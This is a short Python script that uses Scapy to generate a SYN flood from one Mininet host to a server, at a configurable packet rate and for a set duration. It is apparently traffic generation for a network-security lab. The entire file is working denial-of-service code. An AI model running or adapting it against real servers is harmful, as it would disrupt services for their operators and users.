#!/usr/bin/env python3
"""
send_attack.py — SYN Flood Traffic Generator.

Simulates a SYN Flood attack from h2 (10.0.1.82, attacker) to h3 (server).
Uses sendp() (Layer 2) directly — does not require tcpreplay.

Run from Mininet on h2:
    mininet> h2 python3 send_attack.py &

Or directly:
    python3 send_attack.py [--dst 10.0.6.1] [--pps 50] [--duration 60]
"""

import argparse
import random
import time
from scapy.all import Ether, IP, TCP, get_if_hwaddr, sendp

DEFAULT_DST      = '10.0.6.1'
DEFAULT_DST_PORT = 80
DEFAULT_PPS      = 50     # Packets per second (approximate — Python has overhead)
DEFAULT_DURATION = 60     # Attack duration in seconds


def main():
    parser = argparse.ArgumentParser(description='SYN Flood attack generator')
    parser.add_argument('--dst',      default=DEFAULT_DST,      help='Destination IP (server)')
    parser.add_argument('--dport',    type=int, default=DEFAULT_DST_PORT, help='Destination port')
    parser.add_argument('--pps',      type=int, default=DEFAULT_PPS,      help='Packets per second (approximate)')
    parser.add_argument('--duration', type=int, default=DEFAULT_DURATION,  help='Duration in seconds')
    args = parser.parse_args()

    iface   = 'eth0'
    src_mac = get_if_hwaddr(iface)
    interval = 1.0 / max(args.pps, 1)   # Seconds between packets

    print(f"[ATTACK] SYN Flood: {args.dst}:{args.dport} at ~{args.pps} pps for {args.duration}s")
    print(f"[ATTACK] Interface: {iface}  |  Ctrl+C to stop\n")

    count    = 0
    end_time = time.time() + args.duration

    try:
        while time.time() < end_time:
            pkt = (Ether(src=src_mac, dst='ff:ff:ff:ff:ff:ff') /
                   IP(src='10.0.1.82', dst=args.dst) /
                   TCP(sport=random.randint(1024, 65535),
                       dport=args.dport,
                       flags='S',
                       seq=random.randint(0, 2**32 - 1)))
            sendp(pkt, iface=iface, verbose=False)
            count += 1
            time.sleep(interval)
    except KeyboardInterrupt:
        pass

    print(f"\n[ATTACK] Finished. Sent {count} SYN packets in {args.duration}s.")


if __name__ == '__main__':
    main()
